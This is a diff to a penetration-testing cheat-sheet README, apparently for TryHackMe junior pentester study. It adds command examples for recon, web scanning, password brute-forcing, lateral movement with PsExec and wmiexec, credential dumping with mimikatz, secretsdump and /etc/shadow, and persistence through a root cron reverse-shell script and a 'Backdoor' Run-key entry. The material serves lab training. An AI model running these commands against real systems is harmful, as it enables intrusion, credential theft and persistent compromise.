@@ -40,6 +40,27 @@ This repository contains a collection of commands and notes for reconnaissance, 
 - **Passive Recon**: `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`, `assetfinder`, `subfinder`, `amass`, `dnsx`, `anubis`, `dnstwist`, `altdns`, `findomain`, `asnlookup`
 - **Active Recon**: `nmap`, `rustscan`, `masscan`, `naabu`, `dnsenum`, `massdns`, `fierce`, `dnsvalidator`, `puredns`, `shuffledns`, `hosthunter`, `host`, `dig`, `nslookup`, `nc`, `tshark`, `wireshark`
 
+### Example Commands
+```bash
+# Nmap Scan
+nmap -sC -sV -A -T4 target
+# Rustscan Fast Port Scan
+rustscan -a target -- -sV -O
+# DNS Queries
+dig domain.com
+nslookup domain.com
+host domain.com
+# Banner Grabbing
+nc -nv domain.com 80
+telnet domain.com 80
+# DNS Zone Transfer
+dig axfr @ns1.domain.com domain.com
+# Subdomain Enumeration
+dnsenum domain.com
+massdns -r resolvers.txt -t A domain.com
+fierce --domain domain.com
+```
+
 ### Example: Banner Grabbing
 ```bash
 nc -nv domain.com 80
@@ -65,6 +86,53 @@ dig axfr @ns1.domain.com domain.com
 
 ### Key Tools & Commands
 - `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`, `dirsearch`, `gospider`, `hakrawler`, `httprobe`, `httpx`, `paramspider`, `arjun`, `linkfinder`, `403bypasser`, `nuclei`, `wapiti`, `jaeles`, `burpsuite`, `owasp zap`, `sslscan`, `waybackurls`, `gau`, `katana`, `gowitness`
+
+```bash
+# Directory Brute-Forcing with ffuf
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
+# Directory Brute-Forcing with gobuster
+gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
+# SQL Injection with sqlmap
+sqlmap -u "http://domain.com/page?id=1" --dbs
+# XSS Testing with dalfox
+dalfox url http://domain.com
+# XSS Testing with xsstrike
+xsstrike -u http://domain.com
+# Vulnerability Scanning with nikto
+nikto -h http://domain.com
+# WordPress Scanning with wpscan
+wpscan --url http://domain.com --enumerate u,p
+# Directory Brute-Forcing with dirsearch
+dirsearch -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
+# Web Crawling with gospider
+gospider -s http://domain.com
+# Web Crawling with hakrawler
+hakrawler -url http://domain.com
+# HTTP Probing with httpx
+httpx -l subdomains.txt -sc
+# Parameter Discovery with paramspider
+paramspider -d domain.com
+# Parameter Discovery with arjun
+arjun -u http://domain.com
+# Link Extraction with linkfinder
+linkfinder -i http://domain.com
+# 403 Bypass with 403bypasser
+403bypasser -u http://domain.com
+# Vulnerability Scanning with nuclei
+nuclei -u http://domain.com
+# Vulnerability Scanning with wapiti
+wapiti -u http://domain.com
+# SSL Scanning with sslscan
+sslscan domain.com
+# Wayback URLs with waybackurls
+waybackurls domain.com
+# Wayback URLs with gau
+gau domain.com
+# Web Crawling with katana
+katana -u http://domain.com
+# Screenshotting with gowitness
+gowitness scan -f urls.txt
+```
 
 ### Manual Testing Checklist
 - Try all HTTP methods
@@ -111,10 +179,18 @@ enum4linux -a domain.com
 smbclient -L //domain.com/
 # FTP Brute Force
 hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://domain.com
+# FTP Brute Force with medusa
+medusa -u user -P /usr/share/wordlists/rockyou.txt -h domain.com -M ftp
+# SMB Brute Force with crackmapexec
+crackmapexec smb domain.com -u user -p /usr/share/wordlists/rockyou.txt
 # SNMP Enumeration
 snmpwalk -v2c -c public domain.com
+# RDP Connection
+xfreerdp /u:user /p:pass /v:domain.com
 # Packet Capture
 tcpdump -i eth0 -w capture.pcap
+# Traffic Sniffing with mitmproxy
+mitmproxy -m transparent
 ```
 
 ---
@@ -139,6 +215,11 @@ GetNPUsers.py domain/ -usersfile users.txt -no-pass
 # Windows Enumeration
 net user /domain
 net group "Domain Admins" /domain
+dsquery * -limit 100
+# Lateral Movement with PsExec
+PsExec.exe \\domain.com -u user -p pass cmd
+# Lateral Movement with wmiexec
+wmiexec.py domain/user:pass@domain.com
 ```
 
 ---
@@ -158,6 +239,33 @@ net group "Domain Admins" /domain
 
 ### Host Recon
 - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`
+
+```bash
+# Linux Privilege Escalation
+./linpeas.sh > linpeas_out.txt
+find / -perm -4000 2>/dev/null
+crontab -l
+# Windows Privilege Escalation
+winPEAS.exe > winpeas_out.txt
+# Windows Credential Dumping
+mimikatz
+secretsdump.py -just-dc-user domain/user:pass@dc-ip
+samdump2
+# Linux Credential Dumping
+cat /etc/shadow
+# Linux Persistence
+echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
+# Windows Persistence
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
+# Host Recon
+whoami
+hostname
+ipconfig /all
+ifconfig
+ps aux
+tasklist
+netstat -ano
+```
 
 ---
 
@@ -195,6 +303,9 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
   - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
   - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
   - **Subnetting**: Know how to calculate IP ranges (e.g., 192.168.1.0/24)
+  - **Subdimain Enum** `dnsenum domain.com`
+`massdns -r resolvers.txt -t A domain.com`
+`fierce --domain domain.com`
 
 ## Web Application Testing
 
@@ -203,6 +314,22 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 - **File Upload Bypass**: Try `.php`, `.php.jpg`, `.phtml`, change Content-Type in Burp
 - **Bypass Client-Side Controls**: Disable JavaScript, intercept/modify requests in Burp
 - **Manual Testing**: Try all HTTP methods, test for parameter pollution, hidden fields
+
+### Example Commands:
+```bash
+# Directory Brute-Forcing
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
+gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
+# SQL Injection
+sqlmap -u "http://domain.com/page?id=1" --dbs
+# XSS Testing
+dalfox url http://domain.com
+xsstrike -u http://domain.com
+# Vulnerability Scanning
+nikto -h http://domain.com
+wpscan --url http://domain.com --enumerate u,p
+```
+
 
 ### Common HTTP Status Codes
 
@@ -220,7 +347,6 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
 | 500  | Internal Service Error   | The server encountered an error it can't handle. |
 | 503  | Service Unavailable      | The server is overloaded or down for maintenance. |
 
-# ... existing code ...
 
 ## Network Penetration Testing
 
@@ -230,7 +356,18 @@ This section is a quick-access guide for the TryHackMe Junior Penetration Tester
   - **SNMP**: `snmpwalk -v2c -c public target`
   - **RDP**: `xfreerdp /u:user /p:pass /v:target`
 - **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
+```bash
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target
+medusa -u user -P /usr/share/wordlists/rockyou.txt -h target -M ssh
+crackmapexec smb target -u user -p /usr/share/wordlists/rockyou.txt
+```
+
 - **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`
+```bash
+tcpdump -i eth0 -w capture.pcap
+wireshark
+mitmproxy -m transparent
+```
 
 ## Active Directory Exploitation
 
